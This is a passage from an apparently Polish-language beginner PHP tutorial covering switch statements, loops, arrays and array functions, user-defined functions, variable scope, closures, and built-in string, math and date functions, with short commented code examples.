    $dzien = "poniedziałek";
    
    switch ($dzien) {
        case "poniedziałek":
            echo "Rozpoczynamy tydzień!";
            break;
        
        case "wtorek":
        case "środa":
        case "czwartek":
            echo "Środek tygodnia";
            break;
        
        case "piątek":
            echo "Prawie weekend!";
            break;
        
        case "sobota":
        case "niedziela":
            echo "Weekend! Czas na odpoczynek!";
            break;
        
        default:
            echo "Nieznany dzień";
    }
?>
```

**WAŻNE:** `break;` kończy wykonywanie switch. Bez niego kod "przechodzi" do kolejnego case!

#### **Przykład bez break (efekt fall-through):**

```php
<?php
    $liczba = 2;
    
    switch ($liczba) {
        case 1:
            echo "Jeden ";
            // Brak break!
        case 2:
            echo "Dwa ";
            // Brak break!
        case 3:
            echo "Trzy";
            break;
    }
    
    // Wyświetli: Dwa Trzy
    // Bo brakuje break w case 2, więc kod "spada" dalej
?>
```

#### **Praktyczny przykład - kalkulator ocen**

```php
<?php
    $punkty = 85;
    $ocena = "";
    
    switch (true) {
        case ($punkty >= 90):
            $ocena = "Celujący (6)";
            break;
        case ($punkty >= 75):
            $ocena = "Bardzo dobry (5)";
            break;
        case ($punkty >= 60):
            $ocena = "Dobry (4)";
            break;
        case ($punkty >= 50):
            $ocena = "Dostateczny (3)";
            break;
        case ($punkty >= 40):
            $ocena = "Dopuszczający (2)";
            break;
        default:
            $ocena = "Niedostateczny (1)";
    }
    
    echo "Zdobyłeś $punkty punktów - $ocena";
?>
```

### **IF vs SWITCH - kiedy którego używać?**

| Sytuacja | Użyj |
|----------|------|
| Sprawdzasz **jedną zmienną** na wiele **konkretnych wartości** | SWITCH |
| Sprawdzasz **złożone warunki** (>, <, &&, \|\|) | IF |
| Masz **zakres wartości** (np. wiek >= 18) | IF |
| Porównujesz **różne zmienne** | IF |
| Sprawdzasz **dokładną równość** wielu wartości | SWITCH |

**Przykłady:**

```php
<?php
    // DOBRZE - switch dla konkretnych wartości
    switch ($rola) {
        case "admin": /* ... */ break;
        case "moderator": /* ... */ break;
        case "user": /* ... */ break;
    }
    
    // ŹLE - if byłby lepszy dla zakresów
    switch (true) {
        case ($wiek >= 18): /* ... */ break;  // Użyj IF!
    }
    
    // DOBRZE - if dla złożonych warunków
    if ($wiek >= 18 && $maKonto && $weryfikacja) {
        // ...
    }
?>
```

---

## **6. Pętle - powtarzanie kodu**

Pętle pozwalają wykonywać ten sam kod wiele razy, zamiast pisać go wielokrotnie.

### **Pętla WHILE - wykonuj dopóki warunek jest prawdziwy**

```php
<?php
    $i = 1;
    
    while ($i <= 5) {
        echo "Liczba: $i<br>";
        $i++;  // WAŻNE! Zwiększamy licznik, inaczej pętla nigdy się nie skończy
    }
    
    // Wynik:
    // Liczba: 1
    // Liczba: 2
    // Liczba: 3
    // Liczba: 4
    // Liczba: 5
?>
```

**Schemat działania:**
```
DOPÓKI warunek jest prawdziwy
    wykonuj kod
    (i zwiększaj/zmniejszaj licznik!)
KONIEC
```

#### **UWAGA - nieskończona pętla (błąd!):**

```php
<?php
    $i = 1;
    
    while ($i <= 5) {
        echo "Liczba: $i<br>";
        // Brak $i++; - pętla nigdy się nie skończy!
    }
?>
```

### **Pętla DO-WHILE - wykonaj przynajmniej raz**

Różnica od `while`: kod wykona się przynajmniej raz, nawet jeśli warunek jest fałszywy:

```php
<?php
    $i = 10;
    
    // Zwykły while - NIE wykona się
    while ($i <= 5) {
        echo "Nie wyświetli się";
        $i++;
    }
    
    // Do-while - wykona się raz
    do {
        echo "Wyświetli się raz: $i<br>";
        $i++;
    } while ($i <= 5);
?>
```

### **Pętla FOR - gdy wiesz ile razy powtórzyć**

Najczęściej używana pętla do określonej liczby powtórzeń:

```php
<?php
    // for (start; warunek; krok)
    for ($i = 1; $i <= 5; $i++) {
        echo "Liczba: $i<br>";
    }
    
    // Wynik:
    // Liczba: 1
    // Liczba: 2
    // Liczba: 3
    // Liczba: 4
    // Liczba: 5
?>
```

**Jak działa pętla FOR?**

```
1. $i = 1            (wykonuje się RAZ na początku)
2. Sprawdź: $i <= 5  (jeśli true, wykonaj kod)
3. Wykonaj kod w pętli
4. $i++              (zwiększ licznik)
5. Wróć do kroku 2
```

#### **Przykłady pętli FOR:**

```php
<?php
    // Liczenie od 1 do 10
    for ($i = 1; $i <= 10; $i++) {
        echo "$i ";
    }
    // 1 2 3 4 5 6 7 8 9 10
    
    // Odliczanie w dół
    for ($i = 10; $i > 0; $i--) {
        echo "$i ";
    }
    echo "Start!";
    // 10 9 8 7 6 5 4 3 2 1 Start!
    
    // Co druga liczba
    for ($i = 0; $i <= 10; $i += 2) {
        echo "$i ";
    }
    // 0 2 4 6 8 10
    
    // Niestandardowy krok
    for ($i = 1; $i <= 100; $i *= 2) {
        echo "$i ";
    }
    // 1 2 4 8 16 32 64
?>
```

### **Pętla FOREACH - dla tablic**

Specjalna pętla do przechodzenia przez wszystkie elementy tablicy:

```php
<?php
    $owoce = ["jabłko", "banan", "gruszka", "pomarańcza"];
    
    // Sposób 1: tylko wartości
    foreach ($owoce as $owoc) {
        echo "Lubię $owoc<br>";
    }
    
    // Wynik:
    // Lubię jabłko
    // Lubię banan
    // Lubię gruszka
    // Lubię pomarańcza
    
    // Sposób 2: indeks i wartość
    foreach ($owoce as $indeks => $owoc) {
        echo "$indeks: $owoc<br>";
    }
    
    // Wynik:
    // 0: jabłko
    // 1: banan
    // 2: gruszka
    // 3: pomarańcza
?>
```

#### **FOREACH dla tablic asocjacyjnych:**

```php
<?php
    $osoba = [
        "imie" => "Jan",
        "nazwisko" => "Kowalski",
        "wiek" => 25,
        "miasto" => "Warszawa"
    ];
    
    foreach ($osoba as $klucz => $wartosc) {
        echo "$klucz: $wartosc<br>";
    }
    
    // Wynik:
    // imie: Jan
    // nazwisko: Kowalski
    // wiek: 25
    // miasto: Warszawa
?>
```

### **BREAK - przerwanie pętli**

`break` natychmiast kończy pętlę:

```php
<?php
    // Szukanie liczby
    for ($i = 1; $i <= 10; $i++) {
        if ($i == 5) {
            echo "Znaleziono 5!";
            break;  // Przerywa pętlę
        }
        echo "$i ";
    }
    
    // Wyświetli: 1 2 3 4 Znaleziono 5!
?>
```

#### **Praktyczny przykład - szukanie w tablicy:**

```php
<?php
    $uczniowie = ["Anna", "Piotr", "Jan", "Maria", "Tomasz"];
    $szukany = "Jan";
    $znaleziono = false;
    
    foreach ($uczniowie as $indeks => $uczen) {
        if ($uczen == $szukany) {
            echo "Znaleziono $szukany na pozycji $indeks";
            $znaleziono = true;
            break;  // Nie trzeba szukać dalej
        }
    }
    
    if (!$znaleziono) {
        echo "Nie znaleziono";
    }
?>
```

### **CONTINUE - pominięcie iteracji**

`continue` pomija resztę kodu w aktualnej iteracji i przechodzi do następnej:

```php
<?php
    // Wyświetl liczby parzyste
    for ($i = 1; $i <= 10; $i++) {
        if ($i % 2 != 0) {
            continue;  // Pomija nieparzyste
        }
        echo "$i ";
    }
    
    // Wyświetli: 2 4 6 8 10
?>
```

#### **Praktyczny przykład - pomijanie pustych wartości:**

```php
<?php
    $dane = ["Anna", "", "Piotr", null, "Jan", ""];
    
    foreach ($dane as $wartosc) {
        if (empty($wartosc)) {
            continue;  // Pomija puste wartości
        }
        echo "$wartosc<br>";
    }
    
    // Wyświetli tylko:
    // Anna
    // Piotr
    // Jan
?>
```

### **Zagnieżdżone pętle**

Pętle w pętlach:

```php
<?php
    // Tabliczka mnożenia
    for ($i = 1; $i <= 5; $i++) {
        for ($j = 1; $j <= 5; $j++) {
            $wynik = $i * $j;
            echo "$i × $j = $wynik\t";
        }
        echo "<br>";
    }
    
    // Rysowanie trójkąta
    for ($i = 1; $i <= 5; $i++) {
        for ($j = 1; $j <= $i; $j++) {
            echo "*";
        }
        echo "<br>";
    }
    
    // Wynik:
    // *
    // **
    // ***
    // ****
    // *****
?>
```

### **Porównanie pętli - kiedy której użyć?**

| Pętla | Kiedy używać | Przykład |
|-------|--------------|----------|
| **while** | Gdy nie wiesz ile razy się wykona | Czytanie pliku linia po linii |
| **do-while** | Gdy kod musi wykonać się przynajmniej raz | Menu - pokaż, dopóki użytkownik nie wybierze "wyjście" |
| **for** | Gdy wiesz dokładnie ile razy powtórzyć | Liczenie od 1 do 10 |
| **foreach** | Gdy przechodzisz przez tablicę | Wyświetlanie listy produktów |

### **Praktyczne przykłady pętli**

#### **Przykład 1: Suma liczb**

```php
<?php
    $suma = 0;
    
    for ($i = 1; $i <= 100; $i++) {
        $suma += $i;
    }
    
    echo "Suma liczb od 1 do 100: $suma";  // 5050
?>
```

#### **Przykład 2: Liczby pierwsze**

```php
<?php
    echo "Liczby pierwsze od 2 do 50:<br>";
    
    for ($liczba = 2; $liczba <= 50; $liczba++) {
        $jestPierwsza = true;
        
        for ($dzielnik = 2; $dzielnik < $liczba; $dzielnik++) {
            if ($liczba % $dzielnik == 0) {
                $jestPierwsza = false;
                break;
            }
        }
        
        if ($jestPierwsza) {
            echo "$liczba ";
        }
    }
    
    // Wyświetli: 2 3 5 7 11 13 17 19 23 29 31 37 41 43 47
?>
```

#### **Przykład 3: Generowanie listy HTML**

```php
<?php
    $produkty = [
        ["nazwa" => "Laptop", "cena" => 2500],
        ["nazwa" => "Mysz", "cena" => 50],
        ["nazwa" => "Klawiatura", "cena" => 150],
        ["nazwa" => "Monitor", "cena" => 800]
    ];
    
    echo "<ul>";
    foreach ($produkty as $produkt) {
        echo "<li>{$produkt['nazwa']} - {$produkt['cena']} zł</li>";
    }
    echo "</ul>";
?>
```

---

## **7. Tablice - przechowywanie wielu danych**

Tablica to zmienna, która może przechowywać wiele wartości jednocześnie.

**Analogia:** Tablica jest jak szafa z szufladami:
- **Szafa** = tablica
- **Szuflady** = elementy tablicy
- **Etykiety szuflad** = klucze/indeksy
- **Zawartość szuflad** = wartości

### **Tablica indeksowana (numerowana)**

Elementy numerowane automatycznie od 0:

```php
<?php
    // Sposób 1 - array()
    $owoce = array("jabłko", "banan", "gruszka");
    
    // Sposób 2 - [] (nowocześniejszy, zalecany)
    $owoce = ["jabłko", "banan", "gruszka"];
    
    // Dostęp do elementów (indeksy od 0!)
    echo $owoce[0];  // jabłko
    echo $owoce[1];  // banan
    echo $owoce[2];  // gruszka
    
    // Zmiana wartości
    $owoce[1] = "pomarańcza";
    echo $owoce[1];  // pomarańcza
    
    // Dodawanie elementu na końcu
    $owoce[] = "śliwka";
    echo $owoce[3];  // śliwka
?>
```

**WAŻNE:** Tablice w PHP (i większości języków programowania) zaczynają się od indeksu **0**, nie 1!

```
Indeks:    0         1        2
Wartość: [jabłko] [banan] [gruszka]
```

### **Tablica asocjacyjna (z nazwanymi kluczami)**

Elementy mają własne nazwy (klucze):

```php
<?php
    $osoba = [
        "imie" => "Jan",
        "nazwisko" => "Kowalski",
        "wiek" => 25,
        "miasto" => "Warszawa",
        "email" => "jan@example.com"
    ];
    
    // Dostęp do elementów
    echo $osoba["imie"];      // Jan
    echo $osoba["wiek"];      // 25
    echo $osoba["email"];     // jan@example.com
    
    // Zmiana wartości
    $osoba["wiek"] = 26;
    
    // Dodawanie nowego elementu
    $osoba["telefon"] = "123456789";
?>
```

**Wizualizacja:**
```
Klucz        =>  Wartość
"imie"       =>  "Jan"
"nazwisko"   =>  "Kowalski"
"wiek"       =>  25
"miasto"     =>  "Warszawa"
```

### **Tablica wielowymiarowa (tablica w tablicy)**

```php
<?php
    // Tablica 2D - lista uczniów
    $uczniowie = [
        ["Jan", "Kowalski", 5],
        ["Anna", "Nowak", 4],
        ["Piotr", "Wiśniewski", 6],
        ["Maria", "Kowalczyk", 5]
    ];
    
    // Dostęp do elementów
    echo $uczniowie[0][0];  // Jan (pierwszy uczeń, pierwsze pole)
    echo $uczniowie[0][1];  // Kowalski
    echo $uczniowie[0][2];  // 5
    echo $uczniowie[1][0];  // Anna (drugi uczeń, pierwsze pole)
    
    // Przechodzenie przez tablicę 2D
    foreach ($uczniowie as $uczen) {
        echo $uczen[0] . " " . $uczen[1] . " - ocena: " . $uczen[2] . "<br>";
    }
    
    // Wynik:
    // Jan Kowalski - ocena: 5
    // Anna Nowak - ocena: 4
    // Piotr Wiśniewski - ocena: 6
    // Maria Kowalczyk - ocena: 5
?>
```

#### **Tablica asocjacyjna 2D (lepiej czytelna):**

```php
<?php
    $uczniowie = [
        [
            "imie" => "Jan",
            "nazwisko" => "Kowalski",
            "ocena" => 5
        ],
        [
            "imie" => "Anna",
            "nazwisko" => "Nowak",
            "ocena" => 4
        ],
        [
            "imie" => "Piotr",
            "nazwisko" => "Wiśniewski",
            "ocena" => 6
        ]
    ];
    
    // Dostęp do elementów
    echo $uczniowie[0]["imie"];     // Jan
    echo $uczniowie[1]["nazwisko"]; // Nowak
    echo $uczniowie[2]["ocena"];    // 6
    
    // Przechodzenie przez tablicę
    foreach ($uczniowie as $uczen) {
        echo "{$uczen['imie']} {$uczen['nazwisko']} - ocena: {$uczen['ocena']}<br>";
    }
?>
```

### **Podstawowe operacje na tablicach**

#### **1. Dodawanie elementów**

```php
<?php
    $owoce = ["jabłko", "banan"];
    
    // Sposób 1: [] - dodaje na końcu
    $owoce[] = "pomarańcza";
    
    // Sposób 2: array_push() - dodaje jeden lub więcej elementów na końcu
    array_push($owoce, "gruszka", "śliwka");
    
    // Sposób 3: array_unshift() - dodaje na początku
    array_unshift($owoce, "arbuz");
    
    print_r($owoce);
    // Array ( [0] => arbuz [1] => jabłko [2] => banan [3] => pomarańcza [4] => gruszka [5] => śliwka )
?>
```

#### **2. Usuwanie elementów**

```php
<?php
    $owoce = ["jabłko", "banan", "gruszka", "pomarańcza"];
    
    // unset() - usuwa element o konkretnym indeksie
    unset($owoce[1]);  // Usuwa "banan"
    print_r($owoce);
    // Array ( [0] => jabłko [2] => gruszka [3] => pomarańcza )
    // UWAGA: indeks 1 został usunięty, nie ma "przep indexed"
    
    // array_values() - resetuje indeksy
    $owoce = array_values($owoce);
    print_r($owoce);
    // Array ( [0] => jabłko [1] => gruszka [2] => pomarańcza )
    
    // array_pop() - usuwa i zwraca ostatni element
    $ostatni = array_pop($owoce);
    echo $ostatni;  // pomarańcza
    
    // array_shift() - usuwa i zwraca pierwszy element
    $pierwszy = array_shift($owoce);
    echo $pierwszy;  // jabłko
?>
```

#### **3. Sprawdzanie istnienia**

```php
<?php
    $owoce = ["jabłko", "banan", "gruszka"];
    
    // in_array() - czy wartość istnieje w tablicy?
    if (in_array("banan", $owoce)) {
        echo "Banan jest na liście";  // Wykona się
    }
    
    // array_key_exists() - czy klucz istnieje?
    $osoba = ["imie" => "Jan", "wiek" => 25];
    if (array_key_exists("imie", $osoba)) {
        echo "Klucz 'imie' istnieje";  // Wykona się
    }
    
    // isset() - czy klucz istnieje i nie jest null?
    if (isset($osoba["imie"])) {
        echo "Klucz 'imie' istnieje i ma wartość";
    }
?>
```

#### **4. Wyszukiwanie**

```php
<?php
    $owoce = ["jabłko", "banan", "gruszka", "pomarańcza"];
    
    // array_search() - znajduje klucz dla wartości
    $indeks = array_search("gruszka", $owoce);
    echo $indeks;  // 2
    
    if ($indeks !== false) {
        echo "Gruszka jest pod indeksem $indeks";
    }
?>
```

#### **5. Liczenie elementów**

```php
<?php
    $owoce = ["jabłko", "banan", "gruszka"];
    
    // count() lub sizeof() - liczba elementów
    $ile = count($owoce);
    echo $ile;  // 3
?>
```

### **Sortowanie tablic**

```php
<?php
    // 1. sort() - sortowanie rosnąco (resetuje klucze)
    $liczby = [5, 2, 8, 1, 9];
    sort($liczby);
    print_r($liczby);  // Array ( [0] => 1 [1] => 2 [2] => 5 [3] => 8 [4] => 9 )
    
    // 2. rsort() - sortowanie malejąco (resetuje klucze)
    $liczby = [5, 2, 8, 1, 9];
    rsort($liczby);
    print_r($liczby);  // Array ( [0] => 9 [1] => 8 [2] => 5 [3] => 2 [4] => 1 )
    
    // 3. asort() - sortowanie rosnąco (zachowuje klucze)
    $produkty = ["laptop" => 3500, "mysz" => 120, "monitor" => 1000];
    asort($produkty);
    print_r($produkty);
    // Array ( [mysz] => 120 [monitor] => 1000 [laptop] => 3500 )
    
    // 4. arsort() - sortowanie malejąco (zachowuje klucze)
    arsort($produkty);
    
    // 5. ksort() - sortowanie według kluczy rosnąco
    ksort($produkty);
    // Array ( [laptop] => 3500 [monitor] => 1000 [mysz] => 120 )
    
    // 6. krsort() - sortowanie według kluczy malejąco
    krsort($produkty);
?>
```

### **Łączenie i dzielenie tablic**

```php
<?php
    // array_merge() - łączenie tablic
    $owoce = ["jabłko", "banan"];
    $warzywa = ["marchew", "pomidor"];
    $wszystko = array_merge($owoce, $warzywa);
    print_r($wszystko);
    // Array ( [0] => jabłko [1] => banan [2] => marchew [3] => pomidor )
    
    // array_slice() - wycinanie fragmentu tablicy
    $liczby = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    $fragment = array_slice($liczby, 2, 4);  // Od indeksu 2, weź 4 elementy
    print_r($fragment);  // Array ( [0] => 3 [1] => 4 [2] => 5 [3] => 6 )
    
    // array_splice() - usuwa i zwraca fragment (modyfikuje oryginalną tablicę)
    $usunięte = array_splice($liczby, 2, 3);
?>
```

### **Funkcje agregujące**

```php
<?php
    $liczby = [10, 20, 30, 40, 50];
    
    // array_sum() - suma elementów
    echo array_sum($liczby);  // 150
    
    // max() - największa wartość
    echo max($liczby);  // 50
    
    // min() - najmniejsza wartość
    echo min($liczby);  // 10
    
    // array_product() - iloczyn elementów
    echo array_product([2, 3, 4]);  // 24
?>
```

### **Przekształcanie tablic**

```php
<?php
    // implode() (join) - łączy elementy w string
    $owoce = ["jabłko", "banan", "gruszka"];
    $tekst = implode(", ", $owoce);
    echo $tekst;  // jabłko, banan, gruszka
    
    // explode() - dzieli string na tablicę
    $tekst = "jabłko,banan,gruszka";
    $tablica = explode(",", $tekst);
    print_r($tablica);  // Array ( [0] => jabłko [1] => banan [2] => gruszka )
    
    // array_keys() - zwraca wszystkie klucze
    $osoba = ["imie" => "Jan", "wiek" => 25];
    $klucze = array_keys($osoba);
    print_r($klucze);  // Array ( [0] => imie [1] => wiek )
    
    // array_values() - zwraca wszystkie wartości
    $wartosci = array_values($osoba);
    print_r($wartosci);  // Array ( [0] => Jan [1] => 25 )
    
    // array_flip() - zamienia klucze z wartościami
    $zamienione = array_flip($osoba);
    print_r($zamienione);  // Array ( [Jan] => imie [25] => wiek )
?>
```

### **Zaawansowane funkcje tablicowe**

```php
<?php
    // array_map() - aplikuje funkcję do każdego elementu
    $liczby = [1, 2, 3, 4, 5];
    $kwadraty = array_map(function($n) {
        return $n * $n;
    }, $liczby);
    print_r($kwadraty);  // Array ( [0] => 1 [1] => 4 [2] => 9 [3] => 16 [4] => 25 )
    
    // array_filter() - filtruje elementy według warunku
    $liczby = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    $parzyste = array_filter($liczby, function($n) {
        return $n % 2 == 0;
    });
    print_r($parzyste);  // Array ( [1] => 2 [3] => 4 [5] => 6 [7] => 8 [9] => 10 )
    
    // array_reduce() - redukuje tablicę do jednej wartości
    $suma = array_reduce($liczby, function($carry, $item) {
        return $carry + $item;
    }, 0);
    echo $suma;  // 55
?>
```

### **Przydatna tabela funkcji tablicowych**

| Funkcja | Opis | Przykład |
|---------|------|----------|
| `count($tab)` | Liczba elementów | `count([1,2,3])` → 3 |
| `in_array($val, $tab)` | Czy wartość istnieje? | `in_array("x", ["a","x"])` → true |
| `array_push($tab, $val)` | Dodaj na końcu | `array_push($tab, "nowy")` |
| `array_pop($tab)` | Usuń i zwróć ostatni | `array_pop([1,2,3])` → 3 |
| `array_shift($tab)` | Usuń i zwróć pierwszy | `array_shift([1,2,3])` → 1 |
| `array_unshift($tab, $val)` | Dodaj na początku | `array_unshift($tab, "nowy")` |
| `array_merge($t1, $t2)` | Połącz tablice | `array_merge([1], [2])` → [1,2] |
| `array_slice($tab, $start, $len)` | Wytnij fragment | `array_slice([1,2,3,4], 1, 2)` → [2,3] |
| `implode($sep, $tab)` | Połącz w string | `implode(",", ["a","b"])` → "a,b" |
| `explode($sep, $str)` | Podziel string | `explode(",", "a,b")` → ["a","b"] |
| `sort($tab)` | Sortuj rosnąco | `sort([3,1,2])` → [1,2,3] |
| `rsort($tab)` | Sortuj malejąco | `rsort([1,2,3])` → [3,2,1] |
| `array_keys($tab)` | Zwróć klucze | `array_keys(["a"=>1])` → ["a"] |
| `array_values($tab)` | Zwróć wartości | `array_values(["a"=>1])` → [1] |
| `array_sum($tab)` | Suma elementów | `array_sum([1,2,3])` → 6 |
| `max($tab)` | Największa wartość | `max([1,5,3])` → 5 |
| `min($tab)` | Najmniejsza wartość | `min([1,5,3])` → 1 |

---

## **8. Funkcje - organizacja kodu**

Funkcja to nazwany fragment kodu, który możemy wielokrotnie wywoływać. Zamiast powtarzać ten sam kod, piszemy go raz jako funkcję i używamy gdzie potrzeba.

**Analogia:** Funkcja jest jak przepis kulinarny:
- **Nazwa** = nazwa przepisu (np. "upieczCiasto")
- **Składniki** = parametry funkcji
- **Instrukcje** = kod wewnątrz funkcji
- **Gotowe danie** = zwracana wartość

### **Tworzenie funkcji**

```php
<?php
    // Składnia:
    function nazwaFunkcji() {
        // kod do wykonania
    }
    
    // Prosty przykład:
    function powitanie() {
        echo "Witaj w PHP!<br>";
        echo "Miło Cię poznać!<br>";
    }
    
    // Wywołanie funkcji (wykonanie)
    powitanie();
    powitanie();  // Możemy wywołać wielokrotnie
    
    // Wynik:
    // Witaj w PHP!
    // Miło Cię poznać!
    // Witaj w PHP!
    // Miło Cię poznać!
?>
```

### **Funkcje z parametrami**

Parametry to dane przekazywane do funkcji:

```php
<?php
    // Jeden parametr
    function powitajOsobe($imie) {
        echo "Witaj, $imie!<br>";
    }
    
    powitajOsobe("Anna");   // Witaj, Anna!
    powitajOsobe("Piotr");  // Witaj, Piotr!
    
    // Wiele parametrów
    function przedstawSie($imie, $nazwisko, $wiek) {
        echo "Nazywam się $imie $nazwisko i mam $wiek lat.<br>";
    }
    
    przedstawSie("Jan", "Kowalski", 25);
    // Nazywam się Jan Kowalski i mam 25 lat.
    
    // Parametry różnych typów
    function obliczCeneBrutto($cenaNetto, $stawkaVAT) {
        $brutto = $cenaNetto * (1 + $stawkaVAT);
        echo "Cena brutto: $brutto zł<br>";
    }
    
    obliczCeneBrutto(100, 0.23);  // Cena brutto: 123 zł
?>
```

### **Wartości domyślne parametrów**

Możemy ustawić domyślne wartości dla parametrów:

```php
<?php
    function powitanie($imie = "Gościu", $jezyk = "polski") {
        if ($jezyk == "polski") {
            echo "Witaj, $imie!<br>";
        } else {
            echo "Hello, $imie!<br>";
        }
    }
    
    powitanie();                    // Witaj, Gościu! (używa domyślnych)
    powitanie("Anna");              // Witaj, Anna! (używa domyślnego języka)
    powitanie("John", "angielski"); // Hello, John!
    
    // WAŻNE: Parametry z wartościami domyślnymi muszą być NA KOŃCU
    function test($a, $b = 10, $c = 20) { }  // ✅ Dobrze
    function test($a = 10, $b, $c) { }       // ❌ ŹLE!
?>
```

### **Zwracanie wartości - return**

Funkcja może zwrócić wynik za pomocą `return`:

```php
<?php
    function dodaj($a, $b) {
        return $a + $b;
    }
    
    $wynik = dodaj(5, 3);
    echo $wynik;  // 8
    
    // Można użyć bezpośrednio w wyrażeniach
    echo "Suma: " . dodaj(10, 20);  // Suma: 30
    
    if (dodaj(5, 5) > 8) {
        echo "Suma większa niż 8";
    }
    
    // return kończy wykonywanie funkcji
    function testReturn() {
        echo "To się wykona<br>";
        return;
        echo "To się NIE wykona<br>";  // Kod po return nie wykona się
    }
?>
```

**Funkcja BEZ return:**
```php
<?php
    function bezReturn() {
        echo "Coś robię";
        // Brak return - funkcja zwróci null
    }
    
    $wynik = bezReturn();  // Wyświetli "Coś robię"
    var_dump($wynik);      // NULL
?>
```

### **Typowanie parametrów i zwracanych wartości (PHP 7+)**

```php
<?php
    // Typowanie parametrów
    function dodaj(int $a, int $b): int {
        return $a + $b;
    }
    
    echo dodaj(5, 3);    // 8
    echo dodaj(5.7, 3.2); // 8 (automatyczna konwersja do int)
    
    // Różne typy
    function formatujTekst(string $tekst, bool $wielkie): string {
        if ($wielkie) {
            return strtoupper($tekst);
        }
        return strtolower($tekst);
    }
    
    echo formatujTekst("PHP", true);   // PHP
    echo formatujTekst("PHP", false);  // php
?>
```

### **Zmienna liczba parametrów**

```php
<?php
    // ... - rozpakowanie argumentów
    function suma(...$liczby) {
        $wynik = 0;
        foreach ($liczby as $liczba) {
            $wynik += $liczba;
        }
        return $wynik;
    }
    
    echo suma(1, 2, 3);        // 6
    echo suma(10, 20, 30, 40); // 100
    echo suma(5);              // 5
    
    // func_get_args() - starsza metoda
    function staraSuma() {
        $args = func_get_args();
        return array_sum($args);
    }
?>
```

### **Zasięg zmiennych (scope)**

```php
<?php
    $globalna = "Jestem globalną";
    
    function testZasieg() {
        $lokalna = "Jestem lokalną";
        
        echo $lokalna;     // ✅ Działa
        // echo $globalna; // ❌ NIE działa - zmienna globalna niedostępna
        
        // Aby użyć zmiennej globalnej:
        global $globalna;
        echo $globalna;    // ✅ Teraz działa
    }
    
    testZasieg();
    // echo $lokalna;  // ❌ NIE działa - zmienna lokalna niedostępna poza funkcją
?>
```

### **Zmienne statyczne**

Zmienne statyczne zachowują wartość między wywołaniami funkcji:

```php
<?php
    function licznik() {
        static $licznik = 0;  // Inicjalizacja tylko raz
        $licznik++;
        echo "Wywołanie nr $licznik<br>";
    }
    
    licznik();  // Wywołanie nr 1
    licznik();  // Wywołanie nr 2
    licznik();  // Wywołanie nr 3
?>
```

### **Funkcje anonimowe (lambda)**

Funkcje bez nazwy, przechowywane w zmiennych:

```php
<?php
    // Przypisanie do zmiennej
    $powitanie = function($imie) {
        echo "Witaj, $imie!<br>";
    };
    
    $powitanie("Anna");  // Witaj, Anna!
    
    // Jako parametr innej funkcji
    $liczby = [1, 2, 3, 4, 5];
    $kwadraty = array_map(function($n) {
        return $n * $n;
    }, $liczby);
    
    print_r($kwadraty);  // Array ( [0] => 1 [1] => 4 [2] => 9 [3] => 16 [4] => 25 )
?>
```

### **Funkcje strzałkowe (arrow functions) - PHP 7.4+**

Krótsza składnia dla prostych funkcji:

```php
<?php
    // Zwykła funkcja anonimowa
    $dodaj = function($a, $b) {
        return $a + $b;
    };
    
    // Funkcja strzałkowa (krócej)
    $dodaj = fn($a, $b) => $a + $b;
    
    echo $dodaj(5, 3);  // 8
    
    // Użycie w array_map
    $liczby = [1, 2, 3, 4, 5];
    $kwadraty = array_map(fn($n) => $n * $n, $liczby);
?>
```

### **Przydatne funkcje wbudowane**

#### **Funkcje tekstowe (string)**

```php
<?php
    $tekst = "  Hello World  ";
    
    // Długość tekstu
    strlen($tekst);                    // 15 (ze spacjami)
    strlen(trim($tekst));              // 11 (bez spacji)
    
    // Zmiana wielkości liter
    strtoupper($tekst);                // "  HELLO WORLD  "
    strtolower($tekst);                // "  hello world  "
    ucfirst("hello");                  // "Hello" (pierwsza litera wielka)
    ucwords("hello world");            // "Hello World" (każde słowo z wielkiej)
    
    // Usuwanie białych znaków
    trim($tekst);                      // "Hello World"
    ltrim($tekst);                     // "Hello World  " (z lewej)
    rtrim($tekst);                     // "  Hello World" (z prawej)
    
    // Zastępowanie
    str_replace("World", "PHP", $tekst);   // "  Hello PHP  "
    str_ireplace("WORLD", "PHP", $tekst);  // "  Hello PHP  " (ignoruje wielkość liter)
    
    // Wycinanie
    substr("Hello World", 0, 5);       // "Hello"
    substr("Hello World", 6);          // "World"
    substr("Hello World", -5);         // "World" (od końca)
    
    // Pozycja
    strpos("Hello World", "World");    // 6
    strpos("Hello World", "PHP");      // false (nie znaleziono)
    
    // Powtarzanie
    str_repeat("Ha", 3);               // "HaHaHa"
    
    // Odwracanie
    strrev("Hello");                   // "olleH"
    
    // Porównywanie
    strcmp("abc", "abc");              // 0 (równe)
    strcmp("abc", "def");              // < 0 (abc < def)
?>
```

#### **Funkcje matematyczne**

```php
<?php
    // Wartość bezwzględna
    abs(-15);                // 15
    
    // Zaokrąglanie
    round(4.6);              // 5
    round(4.3);              // 4
    round(4.567, 2);         // 4.57 (do 2 miejsc po przecinku)
    ceil(4.3);               // 5 (zawsze w górę)
    floor(4.9);              // 4 (zawsze w dół)
    
    // Min/Max
    max(5, 10, 3, 8);        // 10
    min(5, 10, 3, 8);        // 3
    max([5, 10, 3, 8]);      // 10 (tablica jako argument)
    
    // Potęgowanie i pierwiastek
    pow(2, 3);               // 8 (2³)
    sqrt(25);                // 5 (√25)
    
    // Losowe liczby
    rand();                  // Losowa liczba
    rand(1, 100);            // Losowa liczba od 1 do 100
    mt_rand(1, 100);         // Lepszy generator losowy
    
    // Stałe matematyczne
    echo M_PI;               // 3.14159265359
    echo M_E;                // 2.7182818284590452354
?>
```

#### **Funkcje dla tablic (omówione w rozdziale 7)**

```php
<?php
    $tab = [3, 1, 4, 1, 5];
    
    count($tab);             // 5 (liczba elementów)
    array_sum($tab);         // 14 (suma)
    array_product($tab);     // 60 (iloczyn)
    in_array(4, $tab);       // true
    array_push($tab, 9);     // Dodaj element
    array_pop($tab);         // Usuń ostatni
    sort($tab);              // Sortuj
    array_unique($tab);      // Usuń duplikaty
?>
```

#### **Funkcje daty i czasu**

```php
<?php
    // Aktualny timestamp
    $now = time();                      // np. 1679234567
    
    // Formatowanie daty
    echo date("Y-m-d");                 // 2024-03-15
    echo date("Y-m-d H:i:s");           // 2024-03-15 14:30:45
    echo date("d/m/Y");                 // 15/03/2024
    echo date("l, j F Y");              // Monday, 15 March 2024
    
    // Formaty daty:
    // Y - rok (4 cyfry)
    // m - miesiąc (01-12)
    // d - dzień (01-31)
    // H - godzina 24h (00-23)
    // i - minuta (00-59)
    // s - sekunda (00-59)
    // l - dzień tygodnia (Monday-Sunday)
    // F - nazwa miesiąca (January-December)
    
